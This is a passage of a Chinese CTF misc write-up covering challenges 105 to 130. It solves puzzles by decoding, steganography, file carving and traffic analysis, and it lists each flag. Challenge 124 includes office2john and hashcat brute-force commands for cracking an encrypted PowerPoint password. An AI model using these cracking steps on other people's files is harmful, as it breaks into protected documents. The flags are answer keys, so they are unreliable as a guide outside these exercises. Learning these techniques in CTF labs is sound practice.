class="line">==QIhM0QDN0Q</span><br></pre></td></tr></table></figure><p>直接解密是解密不出的</p><p>仔细看看发现最后一行的第一个是&#x3D;&#x3D;，按理来说应该是最后一个，所以猜测是每行逆向过了</p><p>逆向回来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">DQoNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KIyAgICAgICAgIDIw</span><br><span class="line">MjEtMDMtMzAgMjA6MDE6MDggICAgICAgICAjDQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj</span><br><span class="line">IyMjIyMjIyMjIyMNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t</span><br><span class="line">LS0tLS0tDQrnqpflj6M6Km5ldyA1MiAtIE5vdGVwYWQrKw0K5pe26Ze0OjIwMjEtMDMtMzAgMjA6</span><br><span class="line">MDE6MTMNClvlm57ovaZdIA0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t</span><br><span class="line">LS0tLS0tLS0tLS0NCueql+WPozoqbmV3IDUyIC0gTm90ZXBhZCsrDQrml7bpl7Q6MjAyMS0wMy0z</span><br><span class="line">MCAyMDowMToxMw0KW+Wbnui9pl0gW+Wbnui9pl0gW+Wbnui9pl0gZmZsbGFhZ2d7e319V1dlZWxs</span><br><span class="line">Y2MpKVvliKDpmaRdIFvliKDpmaRdIDAwbW1lZV9fR0dra0NDNDRGRl9fbW0xMXNzaWlDQ0NDQ0ND</span><br><span class="line">Q0NDQ0MhIQ==</span><br></pre></td></tr></table></figure><p>然后base64就能解密出flag了（注意这里是双写要去重）</p><p>flag：flag{Welc0me_GkC4F_m1siCCCCCC!}</p><h3 id="105-MRCTF2020-Hello-misc"><a href="#105-MRCTF2020-Hello-misc" class="headerlink" title="105.[MRCTF2020]Hello_ misc"></a>105.[MRCTF2020]Hello_ misc</h3><p>得到一个png和一个加密的压缩包，一看就是png有问题</p><p>直接foremost一下这个png，得到一个zip和一个png</p><p>lsb一下这个png</p><img src="屏幕截图 2025-02-20 175855.png" alt="屏幕截图 2025-02-20 175855" style="zoom:33%;"><p>又发现一个png，保存下来看到</p><img src="屏幕截图 2025-02-20 175931.png" alt="屏幕截图 2025-02-20 175931" style="zoom:80%;"><p>密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!@#$%67*()-+</span><br></pre></td></tr></table></figure><p>解压这个压缩包看到</p><img src="屏幕截图 2025-02-20 180336.png" alt="屏幕截图 2025-02-20 180336" style="zoom:80%;"><p>这里大概思路就是将这串东西转化为二进制后发现只有前两位不同，整合起来转ascii码然后转为字符</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> Dec:</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> Dec.readlines():</span><br><span class="line">        Bin = <span class="string">&#x27;&#123;:08b&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(i))</span><br><span class="line">        <span class="built_in">print</span>(Bin)</span><br><span class="line">        Sub_Bin = Bin[:-<span class="number">6</span>]</span><br><span class="line">        res += Sub_Bin</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(res),<span class="number">8</span>):</span><br><span class="line">        full_bin = res[j:j+<span class="number">8</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(full_bin,<span class="number">2</span>)),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>最后就能爆破出rar-passwd:0ac1fe6b77be5dbe</p><p>解压出fffflag.zip一看就是docx，接下来就是crtla改色</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MTEwMTEwMTExMTExMTEwMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTEwMDAwMDAxMTExMTExMTExMDAxMTAx</span><br><span class="line">MTEwMTEwMTEwMDAxMTAxMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTExMTExMTExMTExMTEwMTEwMDEx</span><br><span class="line">MTEwMDAwMTAxMTEwMTExMDExMTEwMTExMTExMTAwMDExMTExMTExMTExMDAxMDAxMTAxMTEwMDAwMDExMTExMDAwMDExMTExMTEx</span><br><span class="line">MTEwMTEwMTAwMDAxMTExMDExMTEwMTExMTExMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTExMTExMTAwMTEwMTExMTExMTExMTEx</span><br><span class="line">MTEwMTEwMTAxMTExMTExMDExMTEwMTExMTAxMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTAxMTExMTAwMTEwMTExMTExMTExMTEx</span><br><span class="line">MTEwMTEwMTAwMDAxMTAwMDAwMTEwMDAwMDAxMTAwMDExMTAwMDAwMTEwMTEwMTEwMTAxMTEwMDAwMDAxMTExMDAwMDExMTExMTEx</span><br></pre></td></tr></table></figure><p>base64，用脚本解密（因为这里需要换行）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 要解码的字符串</span></span><br><span class="line"></span><br><span class="line">encoded_str = <span class="string">&#x27;&#x27;&#x27;MTEwMTEwMTExMTExMTEwMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTEwMDAwMDAxMTExMTExMTExMDAxMTAx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">MTEwMTEwMTEwMDAxMTAxMDExMTEwMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTAxMTExMTExMTExMTExMTEwMTEwMDEx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">MTEwMDAwMTAxMTEwMTExMDExMTEwMTExMTExMTAwMDExMTExMTExMTExMDAxMDAxMTAxMTEwMDAwMDExMTExMDAwMDExMTExMTEx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">MTEwMTEwMTAwMDAxMTExMDExMTEwMTExMTExMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTExMTExMTAwMTEwMTExMTExMTExMTEx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">MTEwMTEwMTAxMTExMTExMDExMTEwMTExMTAxMDExMTAxMTExMTExMTEwMTEwMTEwMTAxMTAxMTExMTAwMTEwMTExMTExMTExMTEx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">MTEwMTEwMTAwMDAxMTAwMDAwMTEwMDAwMDAxMTAwMDExMTAwMDAwMTEwMTEwMTEwMTAxMTEwMDAwMDAxMTExMDAwMDExMTExMTEx&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 按行分割字符串</span></span><br><span class="line"></span><br><span class="line">lines = encoded_str.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 逐行解码并打印</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line"></span><br><span class="line">    decoded_str = base64.b64decode(line).decode()</span><br><span class="line"></span><br><span class="line">    decoded_str = decoded_str.replace(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(decoded_str)</span><br></pre></td></tr></table></figure><p>看到</p><img src="屏幕截图 2025-02-20 181757.png" alt="屏幕截图 2025-02-20 181757" style="zoom:50%;"><p>flag：flag{He1Lo_mi5c~}</p><h3 id="106-UTCTF2020-zero"><a href="#106-UTCTF2020-zero" class="headerlink" title="106.[UTCTF2020]zero"></a>106.[UTCTF2020]zero</h3><p>全文：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lorem ipsum​​​​​​​ dolor ‌‌‌‌‍﻿‍‍sit​​​​​​​​ amet​​​​​​​​​‌‌‌‌‍﻿‍‌, consectetur ​​​​​​​adipiscing​​​​​​​‌‌‌‌‍‬‍‬ elit​​​​​​​.‌‌‌‌‍‬﻿‌​​​​​​​‌‌‌‌‍‬‌‍ Phasellus quis​​​​​​​ tempus​​​​​​ ante, ​​​​​​​​nec vehicula​​​​​​​​​​​​​​​​ mi​​​​​​​​. ​​​​​​​‌‌‌‌‍‬‍﻿Aliquam nec​​​​​​​​​‌‌‌‌‍﻿‬﻿ nisi ut neque​​​​​​​ interdum auctor​​​​​​​.‌‌‌‌‍﻿‍﻿ Aliquam felis ‌‌‌‌‍‬‬‌orci​​​​​​​, vestibulum ‌‌‌‌‍﻿‬‍sit ​​​​​​​amet​​​​​​​​​ ante‌‌‌‌‍‌﻿‬ at​​​​​​​, consectetur‌‌‌‌‍‌﻿﻿ lobortis eros​​​​​​​​​.‌‌‌‌‍‍‍‌ ‌‌‌‌‍‌‌‌​​​​​​​Orci varius​​​​​​​ ​​​​​​​natoque ‌‌‌‌‍﻿‌﻿penatibus et ‌‌‌‌‍‬‌﻿​​​​​​​magnis‌‌‌‌‌﻿‌‍‌‌‌‌‌﻿‌‍ dis ​​​​​​​‌‌‌‌‍‍﻿﻿parturient montes, ​​​​​​​nascetur ridiculus ‌‌‌‌‌﻿‍‌​​​​​​​​​​​​​​‌‌‌‌‌﻿‬‍mus. In finibus‌‌‌‌‌﻿‌‬ magna​​​​​​‌‌‌‌‌﻿‍﻿ mauris, quis‌‌‌‌‍‬‌‍ auctor ‌‌‌‌‍‬‌‍libero congue quis. ‌‌‌‌‍‬‬‬Duis‌‌‌‌‍‬‌‬ sagittis consequat urna non tristique. Pellentesque eu lorem ‌‌‌‌‍﻿‌‍id‌‌‌‌‍‬‬﻿ quam vestibulum ultricies vel ac purus‌‌‌‌‌﻿‌‍.‌‌‌‌‌﻿‍‌‌‌‌‌‍﻿﻿‍</span><br></pre></td></tr></table></figure><p>一眼零宽字符</p><p>直接出了utflag{whyNOT@sc11_4927aajbqk14}</p><p>flag：flag{whyNOT@sc11_4927aajbqk14}</p><h3 id="107-CFI-CTF-2018-webLogon-capture"><a href="#107-CFI-CTF-2018-webLogon-capture" class="headerlink" title="107.[CFI-CTF 2018]webLogon capture"></a>107.[CFI-CTF 2018]webLogon capture</h3><p>总共就没几个流量，慢慢看每个流量就行</p><p>然后就发现了这串东西：</p><p>&#x2F;password:%20%43%46%49%7b%31%6e%73%33%63%75%72%33%5f%6c%30%67%30%6e%7d%20</p><p>解密一下：&#x2F;password: CFI{1ns3cur3_l0g0n} </p><p>flag：flag{1ns3cur3_l0g0n} </p><h3 id="108-WUSTCTF2020-spaceclub"><a href="#108-WUSTCTF2020-spaceclub" class="headerlink" title="108.[WUSTCTF2020]spaceclub"></a>108.[WUSTCTF2020]spaceclub</h3><p>一个txt，打开却什么都没有，sublime打开发现一堆点点点，是有间距的</p><img src="屏幕截图 2025-02-20 191239.png" alt="屏幕截图 2025-02-20 191239" style="zoom:80%;"><p>尝试把长的换成1，短的换成0</p><p>（利用记事本的替换功能）</p><p>得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">011101110110001101110100011001100011001000110000001100100011000001111011011010000011001101110010011001010101111100110001011100110101111101111001001100000111010101110010010111110110011001101100010000000110011101011111011100110011000101111000010111110111001100110001011110000101111101110011001100010111100001111101</span><br></pre></td></tr></table></figure><p>然后随波逐流2进制转ascii就能得到flag了：wctf2020{h3re_1s_y0ur_fl@g_s1x_s1x_s1x}</p><p>flag：flag{h3re_1s_y0ur_fl@g_s1x_s1x_s1x}</p><h3 id="109-ACTF新生赛2020-music"><a href="#109-ACTF新生赛2020-music" class="headerlink" title="109.[ACTF新生赛2020]music"></a>109.[ACTF新生赛2020]music</h3><p>一段MP4，视频打不开</p><p>我们010打开发现</p><img src="屏幕截图 2025-02-20 193714.png" alt="屏幕截图 2025-02-20 193714" style="zoom:80%;"><p>有一堆A1，猜测是整个文件进行了A1异或，我们异或回来</p><img src="屏幕截图 2025-02-20 193857.png" alt="屏幕截图 2025-02-20 193857" style="zoom:80%;"><p>然后就能正常打开了，听到是在报字母于是得到flag</p><p>flag：flag{abcdfghijk}</p><h3 id="110-MRCTF2020-Unravel"><a href="#110-MRCTF2020-Unravel" class="headerlink" title="110.[MRCTF2020]Unravel!!"></a>110.[MRCTF2020]Unravel!!</h3><p>（痛，太痛了——）</p><p>一张图片和一段视频和一个加密的zip</p><p>将图片进行foremost，得到一张图片aes.png，上面内容是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tokyo</span><br></pre></td></tr></table></figure><p>而视频的末尾有一段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key=U2FsdGVkX1/nSQN+hoHL8OwV9iJB/mSdKk5dmusulz4=</span><br></pre></td></tr></table></figure><p>猜测是aes加密</p><p>在线网站： <a href="https://tool.oschina.net/encrypt/">在线加密解密</a></p><p>解密得</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CCGandGulu</span><br></pre></td></tr></table></figure><p>然后解密这个zip，又得到一段音频，直接slighteye解密得到flag：MRCTF{Th1s_is_the_3nd1n9}</p><p>flag：flag{Th1s_is_the_3nd1n9}</p><h3 id="111-GKCTF-2021-excel-骚操作"><a href="#111-GKCTF-2021-excel-骚操作" class="headerlink" title="111.[GKCTF 2021]excel 骚操作"></a>111.[GKCTF 2021]excel 骚操作</h3><p>打开xlsx，先点左上角，选中全部单元格</p><p>然后设置单元格格式，数字，常规，确定</p><p>看到一堆1</p><img src="屏幕截图 2025-02-20 195921.png" alt="屏幕截图 2025-02-20 195921" style="zoom:80%;"><p>把所有的1用黑色填黑</p><p>CTL+F，替换-格式-填充-选黑色-确定</p><p>发现了二维码（可以把单元格变窄一点，列宽改成2.11）</p><img src="屏幕截图 2025-02-20 200323.png" alt="屏幕截图 2025-02-20 200323" style="zoom:80%;"><p>这里一般的扫不出来，需要用中国编码app（因为这是汉信码）</p><img src="adc72e044ab36f3aee5db55164a4721.jpg" alt="adc72e044ab36f3aee5db55164a4721" style="zoom:33%;"><p>flag：flag{9ee0cb62-f443-4a72-e9a3-43c0b910757e}</p><h3 id="112-UTCTF2020-File-Carving"><a href="#112-UTCTF2020-File-Carving" class="headerlink" title="112.[UTCTF2020]File Carving"></a>112.[UTCTF2020]File Carving</h3><p>得到一个png，RGB通道发现This is one of the twists: there is no flag here!.</p><p>foremost发现一个zip，打开无后缀</p><img src="屏幕截图 2025-02-20 202910.png" alt="屏幕截图 2025-02-20 202910" style="zoom:80%;"><p>file一下发现是elf文件，直接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./1</span><br></pre></td></tr></table></figure><img src="屏幕截图 2025-02-20 203014.png" alt="屏幕截图 2025-02-20 203014" style="zoom:80%;"><p>flag：flag{2fbe9adc2ad89c71da48cabe90a121c0}</p><h3 id="113-MRCTF2020-pyFlag"><a href="#113-MRCTF2020-pyFlag" class="headerlink" title="113.[MRCTF2020]pyFlag"></a>113.[MRCTF2020]pyFlag</h3><p>文件里有三张图片，每一张图片后面都有之外的东西。</p><p>要提取出三张图片后面的内容拼接成一个压缩包。</p><p>然后发现压缩包是加密的，爆破一下是1234</p><p>然后提示我们用了多个base加密</p><p>直接basecrack出了</p><img src="屏幕截图 2025-02-23 185241.png" alt="屏幕截图 2025-02-23 185241" style="zoom:80%;"><p>看到MRCTF{Y0u_Are_4_p3rFect_dec0der}</p><p>flag：flag{Y0u_Are_4_p3rFect_dec0der}</p><h3 id="114-watevrCTF-2019-Evil-Cuteness"><a href="#114-watevrCTF-2019-Evil-Cuteness" class="headerlink" title="114.[watevrCTF 2019]Evil Cuteness"></a>114.[watevrCTF 2019]Evil Cuteness</h3><p>得到一张图片，直接foremost一下</p><p>然后发现一个压缩包</p><p>解压得到flag：watevr{7h475_4c7u4lly_r34lly_cu73_7h0u6h}</p><p>flag：flag{7h475_4c7u4lly_r34lly_cu73_7h0u6h}</p><h3 id="115-大流量分析（一）"><a href="#115-大流量分析（一）" class="headerlink" title="115.大流量分析（一）"></a>115.大流量分析（一）</h3><p>要求我们找到黑客的ip地址，直接打开wireshark看</p><p>利用wireshark的<code>统计-IPv4 Statistics-ALL Address</code>功能可以查看IP的数量大小</p><img src="屏幕截图 2025-02-28 131317.png" alt="屏幕截图 2025-02-28 131317" style="zoom:80%;"><p>看到ip<code>183.129.152.140</code>数量最多</p><p>flag：flag{183.129.152.140}</p><h3 id="116-QCTF2018-X-man-A-face"><a href="#116-QCTF2018-X-man-A-face" class="headerlink" title="116.[QCTF2018]X-man-A face"></a>116.[QCTF2018]X-man-A face</h3><p>得到一张图片，一看就是修复二维码</p><p>修复好之后长这样：<br><img src="屏幕截图 2025-02-23 190308.png" alt="屏幕截图 2025-02-23 190308" style="zoom:80%;"></p><p>解码之后得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KFBVIRT3KBZGK5DUPFPVG2LTORSXEX2XNBXV6QTVPFZV6TLFL5GG6YTTORSXE7I=</span><br></pre></td></tr></table></figure><p>base64解码QCTF{Pretty_Sister_Who_Buys_Me_Lobster}</p><p>flag：flag{Pretty_Sister_Who_Buys_Me_Lobster}</p><h3 id="117-二维码"><a href="#117-二维码" class="headerlink" title="117.二维码"></a>117.二维码</h3><p>就是纯拼接二维码</p><p>尝试拼接了一下，结果拼不起来。。</p><img src="屏幕截图 2025-02-23 194647.png" alt="屏幕截图 2025-02-23 194647" style="zoom:50%;"><p>我的尝试。。拼尽全力只能做到这种程度了。</p><p><del>直接找wp的二维码了</del></p><img src="a82437c4c20e7e1ccb92f53939a228a0.png" alt="a82437c4c20e7e1ccb92f53939a228a0" style="zoom:80%;"><p>扫一下就能得到flag了</p><p>flag：flag{7bf116c8ec2545708781fd4a0dda44e5}</p><h3 id="118-派大星的烦恼"><a href="#118-派大星的烦恼" class="headerlink" title="118.派大星的烦恼"></a>118.派大星的烦恼</h3><p>010打开图片，看到</p><img src="屏幕截图 2025-02-28 131938.png" alt="屏幕截图 2025-02-28 131938" style="zoom:80%;"><p>将所有的22换成0，44换成1</p><p>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0110110000101100000011000110110010011100101011000000110010000110101011000010110010001100000111000010110001000110001001101010110001100110101001100110110001000110011011001010011010101100010001100010110011000110101001100010110011001100000111001100110001001100</span><br></pre></td></tr></table></figure><p>然后这里我们cyberchef需要先reverse再binary，后reverse才能出</p><img src="屏幕截图 2025-02-28 132556.png" alt="屏幕截图 2025-02-28 132556" style="zoom:80%;"><p>flag：flag{6406950a54184bd5fe6b6e5b4ce43832}</p><h3 id="119-key不在这里"><a href="#119-key不在这里" class="headerlink" title="119.key不在这里"></a>119.key不在这里</h3><p>一张二维码，扫码得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://cn.bing.com/search?q=key%E4%B8%8D%E5%9C%A8%E8%BF%99%E9%87%8C&amp;m=10210897103375566531005253102975053545155505050521025256555254995410298561015151985150375568&amp;qs=n&amp;form=QBRE&amp;sp=-1&amp;sc=0-38&amp;sk=&amp;cvid=2CE15329C18147CBA4C1CA97C8E1BB8C</span><br></pre></td></tr></table></figure><p>点开发现是再bing上搜索key不在这里</p><p>发现这里有一串数字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10210897103375566531005253102975053545155505050521025256555254995410298561015151985150375568</span><br></pre></td></tr></table></figure><p>猜测是ascii码</p><p>试了前几个发现打印出flag</p><p>所以直接转一下ascii就能出</p><p>脚本（网上找的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;10210897103375566531005253102975053545155505050521025256555254995410298561015151985150375568&#x27;</span></span><br><span class="line">temp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(s):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(s[:<span class="number">3</span>]) &lt; <span class="number">127</span>:</span><br><span class="line">        temp += <span class="built_in">chr</span>(<span class="built_in">int</span>(s[:<span class="number">3</span>]))</span><br><span class="line">        s = s[<span class="number">3</span>:]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        temp += <span class="built_in">chr</span>(<span class="built_in">int</span>(s[:<span class="number">2</span>]))</span><br><span class="line">        s = s[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(temp)</span><br></pre></td></tr></table></figure><p>flag：flag{5d45fa256372224f48746c6fb8e33b32}</p><h3 id="120-INSHack2017-sanity"><a href="#120-INSHack2017-sanity" class="headerlink" title="120.[INSHack2017]sanity"></a>120.[INSHack2017]sanity</h3><p>解压得到一个md文件，直接打开发现INSA{Youre_sane_Good_for_you}</p><p>flag：flag{Youre_sane_Good_for_you}</p><h3 id="121-V-N2020-公开赛-真·签到"><a href="#121-V-N2020-公开赛-真·签到" class="headerlink" title="121.[V&amp;N2020 公开赛]真·签到"></a>121.[V&amp;N2020 公开赛]真·签到</h3><p>直接在题目描述里面了</p><p>flag：flag{welcome_to_vn}</p><h3 id="122-粽子的来历"><a href="#122-粽子的来历" class="headerlink" title="122.粽子的来历"></a>122.粽子的来历</h3><p>打开发现四个doc，又发现打不开doc，010发现</p><img src="屏幕截图 2025-02-28 134104.png" alt="屏幕截图 2025-02-28 134104" style="zoom:80%;"><p>将这里换成FF，即换成yy就能打开了</p><p>打开发现行距不一样，将大的行距换成1，小的换成0</p><img src="屏幕截图 2025-02-28 134434.png" alt="屏幕截图 2025-02-28 134434" style="zoom:80%;"><p>100100100001，flag为md5加密的值</p><p>flag：flag{d473ee3def34bd022f8e5233036b3345}</p><h3 id="123-MRCTF2020-不眠之夜"><a href="#123-MRCTF2020-不眠之夜" class="headerlink" title="123.[MRCTF2020]不眠之夜"></a>123.[MRCTF2020]不眠之夜</h3><p>打开发现有很多图片碎片，需要我们拼接一下</p><p>先</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">montage *.jpg -tile 10x12 -geometry 200x100+0+0 flag.jpg</span><br></pre></td></tr></table></figure><p>拼成一张碎片图</p><img src="屏幕截图 2025-02-28 140726.png" alt="屏幕截图 2025-02-28 140726" style="zoom:80%;"><p>然后利用gaps拼接图片</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gaps run flag.jpg solution.jpg --generations=40 --population=120 --size=200</span><br></pre></td></tr></table></figure><p>或者直接利用<code>Puzzle-Merak</code>来拼接图片</p><p>注意这里新增图片的时候选择的像素不是40而是100</p><p>然后–generations&#x3D;40 –population&#x3D;120 –size&#x3D;200，得到</p><img src="屏幕截图 2025-02-28 143057.png" alt="屏幕截图 2025-02-28 143057" style="zoom:80%;"><p>看到MRCTTF{Why_4re_U_5o_ShuL1an??}</p><p>flag：flag{Why_4re_U_5o_ShuL1an??}</p><h3 id="124-hashcat"><a href="#124-hashcat" class="headerlink" title="124.hashcat"></a>124.hashcat</h3><p>得到一个What kind of document is this_，是ppt文件</p><p>先利用office2john.py把哈希值拿到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python office2john.py 1.ppt &gt;hash</span><br></pre></td></tr></table></figure><img src="屏幕截图 2025-02-28 185333.png" alt="屏幕截图 2025-02-28 185333" style="zoom:80%;"><p>然后利用hashcat爆破就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat.exe -a 3 -m 9500 --force hash --increment --increment-min 1 --increment-max 6 ?d?d?d?d?d?d</span><br></pre></td></tr></table></figure><p>查看密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat.exe -m 9500 hash --show</span><br></pre></td></tr></table></figure><p>能够爆出来是9919</p><ul><li></li></ul><p>或者直接passwarekit直接爆破得到密码：9919</p><p>直接在第七页里面看到了Flag{okYOUWIN}</p><p>flag：flag{okYOUWIN}</p><h3 id="125-UTCTF2020-sstv"><a href="#125-UTCTF2020-sstv" class="headerlink" title="125.[UTCTF2020]sstv"></a>125.[UTCTF2020]sstv</h3><p>得到一个wav音频，直接sstv</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sstv -d 1.wav -o result.png</span><br></pre></td></tr></table></figure><p>直接就出了utflag[6bdfeac1e2baa12d6ac5384cdfd166b0]</p><p>flag：flag{6bdfeac1e2baa12d6ac5384cdfd166b0}</p><h3 id="126-voip"><a href="#126-voip" class="headerlink" title="126.voip"></a>126.voip</h3><p>拿到i一个流量包，直接<code>电话-voip通话</code></p><p>然后点第一个播放就能拿到flag</p><p>flag：flag{9001IVR}</p><h3 id="127-SCTF2019-电单车"><a href="#127-SCTF2019-电单车" class="headerlink" title="127.[SCTF2019]电单车"></a>127.[SCTF2019]电单车</h3><p>解压得到一段音频，直接进aud看看</p><img src="屏幕截图 2025-03-03 105603.png" alt="屏幕截图 2025-03-03 105603" style="zoom:80%;"><p>这是PT2242信号，电动车的解锁信号，<strong>前面4bit表示同步码，中间的20bit表示地址码，后面的4bit表示功能码，最后一位是停止码。</strong></p><p>以时间的长短来分别0和1，那么就是<code>0。。。01110100101010100110。0010。0</code></p><p>也就是<code>00111010010101010011000100</code></p><p>flag：flag{01110100101010100110}</p><h3 id="128-GUET-CTF2019-soul-sipse"><a href="#128-GUET-CTF2019-soul-sipse" class="headerlink" title="128.[GUET-CTF2019]soul sipse"></a>128.[GUET-CTF2019]soul sipse</h3><p>拿到一个wav，先打开频谱图，看到</p><img src="屏幕截图 2025-02-28 203837.png" alt="屏幕截图 2025-02-28 203837" style="zoom:80%;"><p>然后我们用steghide</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf out.wav</span><br></pre></td></tr></table></figure><p>得到一张图片，打不开，我们随波逐流修复文件头或者手动修一下</p><p>就能看到图片了</p><img src="屏幕截图 2025-02-28 204008.png" alt="屏幕截图 2025-02-28 204008" style="zoom:80%;"><p>一看就是unicode编码</p><p>直接随波逐流unicode转str得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4070</span><br><span class="line">1234</span><br></pre></td></tr></table></figure><p>相加之和就是5304</p><p>flag：flag{5304}</p><h3 id="129-UTCTF2020-spectogram"><a href="#129-UTCTF2020-spectogram" class="headerlink" title="129.[UTCTF2020]spectogram"></a>129.[UTCTF2020]spectogram</h3><p>aud打开发现直接看频谱图发现flag</p><img src="屏幕截图 2025-03-03 112109.png" alt="屏幕截图 2025-03-03 112109" style="zoom:80%;"><p>flag：flag{sp3tr0gr4m0ph0n3}</p><h3 id="130-大流量分析（二）"><a href="#130-大流量分析（二）" class="headerlink" title="130.大流量分析（二）"></a>130.大流量分析（二）</h3><p>说是发送了一个钓鱼邮件，我们直接过滤smtp流量看看</p><img 